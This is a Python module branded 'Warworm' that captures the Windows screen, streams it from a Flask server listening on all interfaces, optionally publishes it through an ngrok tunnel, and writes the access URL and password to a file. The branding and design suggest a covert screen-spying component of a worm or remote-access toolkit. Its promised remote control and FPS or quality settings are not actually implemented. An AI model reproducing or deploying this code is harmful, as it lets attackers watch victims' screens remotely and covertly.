#!/usr/bin/env python3
"""
Remote Desktop Module  

Provides screen streaming and remote control via Flask
"""

import os
import sys
import io
import time
import threading
import ctypes
import base64
import random
import string
from datetime import datetime
from PIL import Image, ImageGrab
from flask import Flask, render_template_string, request, session, jsonify, Response

# Ngrok_lib
try:
    from pyngrok import ngrok
    PYNGROK_AVAILABLE = True
except ImportError:
    PYNGROK_AVAILABLE = False

app = Flask(__name__)
app.secret_key = 'warworm_rd_' + ''.join(random.choices(string.ascii_letters + string.digits, k=16))

current_frame = None
frame_lock = threading.Lock()
running = False
screen_w, screen_h = 1920, 1080
ngrok_url = None
server_port = 5000
access_password = ""

# HTML Template 
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Remote Desktop | Warworm</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0f; color: #fff; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
        #loginScreen { position: fixed; inset: 0; display: flex; justify-content: center; align-items: center; background: radial-gradient(ellipse at center, #1a1a2e 0%, #0a0a0f 100%); z-index: 1000; }
        .login-box { background: rgba(30,30,40,0.95); border: 1px solid rgba(0,212,255,0.3); border-radius: 20px; padding: 40px; width: 90%; max-width: 400px; text-align: center; }
        .login-box h1 { color: #00d4ff; margin-bottom: 10px; }
        input[type="password"] { width: 100%; padding: 16px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.2); border-radius: 12px; color: #fff; font-size: 16px; margin: 20px 0; }
        button { padding: 16px 24px; background: linear-gradient(135deg, #00d4ff, #7b2cbf); border: none; border-radius: 12px; color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; }
        #errorMsg { color: #ff3366; margin-top: 12px; display: none; }
        #mainInterface { display: none; width: 100%; height: 100%; position: relative; }
        .viewport { width: 100%; height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; background: #000; }
        .screen-wrapper { position: relative; transition: transform 0.1s; transform-origin: center center; }
        #screenImg { display: block; max-width: 100vw; max-height: 100vh; object-fit: contain; user-select: none; }
        .toolbar { position: fixed; top: 20px; right: 20px; background: rgba(30,30,40,0.95); border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 20px; width: 280px; z-index: 100; }
        .status-bar { position: fixed; bottom: 20px; left: 20px; background: rgba(30,30,40,0.95); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; padding: 12px 16px; display: flex; gap: 16px; font-size: 13px; z-index: 97; }
        .status-dot { width: 8px; height: 8px; border-radius: 50%; background: #00ff88; animation: pulse 2s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        .control-group { margin-bottom: 15px; }
        .control-label { font-size: 11px; color: #888; text-transform: uppercase; margin-bottom: 5px; display: block; }
        input[type=range] { width: 100%; margin: 5px 0; }
    </style>
</head>
<body>
    <div id="loginScreen">
        <div class="login-box">
            <h1>🖥️ Remote Desktop</h1>
            <p style="color: #888; margin-bottom: 20px;">Warworm Access</p>
            <input type="password" id="passwordInput" placeholder="Enter password...">
            <button onclick="doLogin()">Connect</button>
            <div id="errorMsg">Access Denied</div>
        </div>
    </div>

    <div id="mainInterface">
        <div class="toolbar">
            <div style="color: #00d4ff; font-weight: 700; margin-bottom: 16px;">⚙️ Controls</div>
            <div class="control-group">
                <span class="control-label">FPS: <span id="fpsDisplay">30</span></span>
                <input type="range" min="5" max="60" value="30" oninput="updateFPS(this.value)">
            </div>
            <div class="control-group">
                <span class="control-label">Quality: <span id="qualityDisplay">85%</span></span>
                <input type="range" min="10" max="100" value="85" oninput="updateQuality(this.value)">
            </div>
            <div class="control-group">
                <span class="control-label">Zoom: <span id="zoomDisplay">100%</span></span>
                <input type="range" id="zoomSlider" min="50" max="300" value="100" oninput="updateZoom(this.value)">
            </div>
        </div>

        <div class="viewport" id="viewport">
            <div class="screen-wrapper" id="screenWrapper">
                <img id="screenImg" src="" alt="Remote Desktop" draggable="false">
            </div>
        </div>

        <div class="status-bar">
            <div style="display:flex;align-items:center;gap:6px">
                <div class="status-dot"></div>
                <span>Online</span>
            </div>
            <div>FPS: <span id="fpsCounter" style="color: #00d4ff; font-weight: 700;">0</span></div>
        </div>
    </div>

    <script>
        var state = { zoom: 1, fps: 30, quality: 85 };
        var elements = { img: document.getElementById('screenImg'), wrapper: document.getElementById('screenWrapper') };

        function doLogin() {
            fetch('/auth', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({password: document.getElementById('passwordInput').value})
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    document.getElementById('loginScreen').style.display = 'none';
                    document.getElementById('mainInterface').style.display = 'block';
                    startStream();
                } else {
                    document.getElementById('errorMsg').style.display = 'block';
                }
            });
        }

        function startStream() {
            elements.img.src = '/stream?t=' + Date.now();
            var frameCount = 0;
            setInterval(() => {
                document.getElementById('fpsCounter').textContent = frameCount;
                frameCount = 0;
            }, 1000);
            elements.img.onload = () => frameCount++;
        }

        function updateFPS(val) {
            state.fps = parseInt(val);
            document.getElementById('fpsDisplay').textContent = val;
            fetch('/set_fps', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({fps: state.fps})});
        }

        function updateQuality(val) {
            state.quality = parseInt(val);
            document.getElementById('qualityDisplay').textContent = val + '%';
            fetch('/set_quality', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({quality: state.quality})});
        }

        function updateZoom(val) {
            state.zoom = val / 100;
            elements.wrapper.style.transform = 'scale(' + state.zoom + ')';
            document.getElementById('zoomDisplay').textContent = val + '%';
        }

        document.getElementById('passwordInput').addEventListener('keypress', e => {
            if (e.key === 'Enter') doLogin();
        });
    </script>
</body>
</html>
'''

def get_screen_size():
    try:
        user32 = ctypes.windll.user32
        user32.SetProcessDPIAware()
        return user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)
    except:
        return 1920, 1080

def capture_screen():
    global screen_w, screen_h
    try:
        img = ImageGrab.grab()
        if img:
            screen_w, screen_h = img.size
            return img.convert('RGB')
    except Exception as e:
        print(f"[RD] Capture error: {e}")
    return None

def encoder_thread(fps=30, quality=85):
    global current_frame, running
    while running:
        try:
            target_interval = 1.0 / fps
            img = capture_screen()
            if img:
                buffer = io.BytesIO()
                img.save(buffer, format='JPEG', quality=quality, optimize=True)
                with frame_lock:
                    current_frame = buffer.getvalue()
            time.sleep(target_interval)
        except Exception as e:
            print(f"[RD] Encoder error: {e}")
            time.sleep(0.5)

# Flask Routes
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/auth', methods=['POST'])
def auth():
    data = request.get_json()
    if data and data.get('password') == access_password:
        session['authenticated'] = True
        return jsonify({'success': True})
    return jsonify({'success': False}), 403

@app.route('/stream')
def stream():
    if not session.get('authenticated'):
        return jsonify({'error': 'Unauthorized'}), 403
    
    def generate():
        while running:
            with frame_lock:
                data = current_frame
            if data:
                yield (b'--frame\r\nContent-Type: image/jpeg\r\n\r\n' + data + b'\r\n')
            time.sleep(0.25)  # ~30fps
    
    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/set_fps', methods=['POST'])
def set_fps():
    if not session.get('authenticated'):
        return jsonify({'error': 'Unauthorized'}), 403
    # FPS control implemented in encoder thread
    return jsonify({'success': True})

@app.route('/set_quality', methods=['POST'])
def set_quality():
    if not session.get('authenticated'):
        return jsonify({'error': 'Unauthorized'}), 403
    return jsonify({'success': True})

class RemoteDesktop:
    def __init__(self, config=None, output_dir=None):
        self.config = config or {}
        self.output_dir = output_dir or os.path.expanduser("~")
        self.port = random.randint(49000, 65000)
        self.password = self._generate_password()
        self.ngrok_token = self.config.get('ngrok_token', '')
        self.public_url = None
        self.thread = None
        self.encoder_thread = None
        
    def _generate_password(self): # Generate random password or use from config 
        
        if self.config.get('remote_desktop_password'):
            return self.config['remote_desktop_password']
        return ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    
    def _save_credentials(self):
        """Save login credentials to remote_login.txt"""
        creds_file = os.path.join(self.output_dir, "remote_login.txt")
        try:
            with open(creds_file, 'w', encoding='utf-8') as f:
                f.write("=" * 70 + "\n")
                f.write("               WARWORM REMOTE DESKTOP - ACCESS CREDENTIALS\n")
                f.write("=" * 70 + "\n\n")
                f.write(f"Service: Remote Desktop\n")
                f.write(f"Local URL: http://localhost:{self.port}\n")
                if self.public_url:
                    f.write(f"Public URL (Ngrok): {self.public_url}\n")
                f.write(f"Password: {self.password}\n")
                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                f.write("=" * 70 + "\n")
            print(f"    [+] Remote Desktop credentials saved: {creds_file}")
            return True
        except Exception as e:
            print(f"    [!] Failed to save credentials: {e}")
            return False
    
    def _start_ngrok(self):
        # Start ngrok tunnel if token available
        global ngrok_url
        if not PYNGROK_AVAILABLE or not self.ngrok_token:
            return None
        
        try:
            print(f"    [*] Starting Ngrok tunnel...")
            ngrok.set_auth_token(self.ngrok_token)
            self.public_url = ngrok.connect(self.port, "http").public_url
            ngrok_url = self.public_url
            print(f"    [+] Ngrok URL: {self.public_url}")
            return self.public_url
        except Exception as e:
            print(f"    [!] Ngrok failed: {e}")
            return None
    
    def start(self):
        # Starting Remote Desktop  
        global running, access_password, server_port
        
        print("[*] Starting Remote Desktop module...")
        
        # Set globals for Flask
        access_password = self.password
        server_port = self.port
        running = True
        
        # Save credentials immediately
        self._save_credentials()
        
        # Start encoder thread
        self.encoder_thread = threading.Thread(target=encoder_thread, daemon=True)
        self.encoder_thread.start()
        
        # Start ngrok if configured
        if self.ngrok_token:
            self._start_ngrok()
            # Update credentials file with ngrok URL
            self._save_credentials()
        
        # Start Flask in thread
        def run_server():
            try:
                app.run(host='0.0.0.0', port=self.port, threaded=True, debug=False, use_reloader=False)
            except Exception as e:
                print(f"[RD] Server error: {e}")
        
        self.thread = threading.Thread(target=run_server, daemon=True)
        self.thread.start()
        
        print(f"    [+] Remote Desktop started on port {self.port}")
        print(f"    [+] Password: {self.password}")
        if self.public_url:
            print(f"    [+] Public Access: {self.public_url}")
            
        return {
            'port': self.port,
            'password': self.password,
            'ngrok_url': self.public_url,
            'local_url': f"http://localhost:{self.port}"
        }
    
    def stop(self):
        global running
        running = False
        if PYNGROK_AVAILABLE and self.public_url:
            try:
                ngrok.disconnect(self.public_url)
                ngrok.kill()
            except:
                pass
        print("[*] Remote Desktop stopped")

def start_remote_desktop(config, output_dir):
    # Convenience function to start RD 
    rd = RemoteDesktop(config, output_dir)
    return rd.start()